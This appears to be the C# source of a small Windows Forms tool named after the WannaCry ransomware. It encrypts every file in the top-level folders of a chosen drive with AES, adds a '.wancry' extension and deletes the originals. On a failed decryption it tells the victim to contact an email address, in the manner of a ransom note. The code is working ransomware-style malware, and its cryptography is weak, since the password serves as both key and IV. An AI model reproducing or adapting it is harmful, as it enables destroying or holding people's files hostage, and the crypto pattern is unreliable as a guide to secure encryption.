using System;
using System.IO;
using System.Linq;
using System.Security.Cryptography;
using System.Text;
using System.Windows.Forms;

namespace WannaCry
{
    public partial class Form1 : Form
    {
        private string decryptPass = "";
        DriveInfo selectedDrive = null;
        public Form1()
        {
            InitializeComponent();
            foreach (var item in DriveInfo.GetDrives())
            {
                if(item.DriveType == DriveType.Fixed)
                    comboBox1.Items.Add($"{item.Name}-{item.VolumeLabel}");
            }
        }
        
        // Encrypt Button
        private void button1_Click(object sender, EventArgs e)
        {
            if (comboBox1.SelectedItem == null)
            {
                MessageBox.Show("Not choosing drive!");
            }
            else
            {
                decryptPass = textBox1.Text;
                foreach (string directory in Directory.GetDirectories(selectedDrive.ToString()))
                {
                    DirectoryInfo directoryInfo = new DirectoryInfo(directory);
                    try
                    {
                        System.Security.AccessControl.DirectorySecurity directorySecurity = directoryInfo.GetAccessControl();
                        FileInfo[] files = directoryInfo.GetFiles();
                        foreach (FileInfo file in files)
                        {
                            EncryptFile(file.FullName, file.FullName + ".wancry");
                            if (File.Exists(file.FullName))
                                File.Delete(file.FullName);
                        }
                    }
                    catch
                    {
                        continue;
                    }
                }
                MessageBox.Show("Encrypt Success");
            }
        }

        // Decrypt Button
        private void button2_Click(object sender, EventArgs e)
        {
            decryptPass = textBox1.Text;
            if (comboBox1.SelectedItem == null)
            {
                MessageBox.Show("Not choosing drive!");
            }
            else
            {
                decryptPass = textBox1.Text;
                foreach (string directory in Directory.GetDirectories(selectedDrive.ToString()))
                {
                    DirectoryInfo directoryInfo = new DirectoryInfo(directory);
                    try
                    {
                        System.Security.AccessControl.DirectorySecurity directorySecurity = directoryInfo.GetAccessControl();
                        FileInfo[] files = directoryInfo.GetFiles();
                        foreach (FileInfo file in files)
                        {
                            DecryptFile(file.FullName, file.FullName.Replace(".wancry", ""));
                            if (File.Exists(file.FullName))
                                File.Delete(file.FullName);
                        }
                    }
                    catch
                    {
                        continue;
                    }
                }

                MessageBox.Show("Decrypt Success");
            }
        }

        private void comboBox1_SelectedIndexChanged(object sender, EventArgs e)
        {
            selectedDrive = DriveInfo.GetDrives().FirstOrDefault(x => x.Name == comboBox1.SelectedItem.ToString().Split('-')[0]);
            label2.Text = comboBox1.SelectedItem.ToString();
            label2.Visible = true;
            label3.Text = selectedDrive.DriveFormat;
            label3.Visible = true;
            label4.Text = selectedDrive.TotalFreeSpace.ToString();
            label4.Visible = true;
        }

        private void EncryptFile(string inputFile, string outputFile)
        {
            try
            {
                string password = $@"{decryptPass}";
                byte[] key = new UnicodeEncoding().GetBytes(password);
                
                FileStream fsCrypt = new FileStream(outputFile, FileMode.Create);
                RijndaelManaged RMCrypto = new RijndaelManaged();
                CryptoStream cs = new CryptoStream(fsCrypt,RMCrypto.CreateEncryptor(key, key),CryptoStreamMode.Write);
                FileStream fsIn = new FileStream(inputFile, FileMode.Open);

                int data;
                while ((data = fsIn.ReadByte()) != -1)
                    cs.WriteByte((byte)data);

                fsIn.Close();
                cs.Close();
                fsCrypt.Close();
            }
            catch
            {
                MessageBox.Show("Encryption failed!", "Error");
            }
        }

        private void DecryptFile(string inputFile, string outputFile)
        {
            try
            {
                string password = $@"{decryptPass}";

                UnicodeEncoding UE = new UnicodeEncoding();
                byte[] key = UE.GetBytes(password);

                FileStream fsCrypt = new FileStream(inputFile, FileMode.Open);

                RijndaelManaged RMCrypto = new RijndaelManaged();

                CryptoStream cs = new CryptoStream(fsCrypt, RMCrypto.CreateDecryptor(key, key),CryptoStreamMode.Read);

                FileStream fsOut = new FileStream(outputFile, FileMode.Create);

                int data;
                while ((data = cs.ReadByte()) != -1)
                    fsOut.WriteByte((byte)data);

                fsOut.Close();
                cs.Close();
                fsCrypt.Close();
            }
            catch (Exception)
            {
                MessageBox.Show("Wrong Password! \n Please Contact bhdryrdm@gmail.com");
            }
        }

        private void Form1_Load(object sender, EventArgs e)
        {
            
        }
    }
}
